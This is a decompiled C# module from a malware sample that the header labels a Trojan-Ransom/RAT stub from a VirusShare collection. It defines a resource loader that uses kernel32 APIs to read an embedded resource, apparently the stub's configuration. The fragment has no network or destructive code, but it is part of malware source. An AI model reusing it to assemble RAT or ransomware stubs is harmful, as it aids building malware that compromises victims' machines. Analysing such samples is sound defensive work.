// Decompiled with JetBrains decompiler
// Type: OpenSource_RAT_Schäding.mResource
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8170AD08-ABA5-4012-BCC7-4CC67D0071A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.ikxa-53f746507d13e73a4ea2419189ad7b0070faaf51b1e13192df858b42ac6c25c0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace OpenSource_RAT_Schäding
{
  [StandardModule]
  internal sealed class mResource
  {
    [DllImport("kernel32.dll")]
    private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32.dll")]
    private static extern IntPtr LockResource(IntPtr hResData);

    [DllImport("kernel32")]
    private static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

    public static string getData(string sFile, string sKey)
    {
      byte[] array = new byte[2];
      IntPtr resource = mResource.FindResource(IntPtr.Zero, sFile, sKey);
      IntPtr source = mResource.LockResource(mResource.LoadResource(IntPtr.Zero, resource));
      uint newSize = mResource.SizeofResource(IntPtr.Zero, resource);
      string data;
      try
      {
        Array.Resize<byte>(ref array, checked ((int) newSize));
        Marshal.Copy(source, array, 0, Convert.ToInt32(newSize));
        data = Encoding.Default.GetString(array);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        data = (string) null;
        ProjectData.ClearProjectError();
      }
      return data;
    }
  }
}
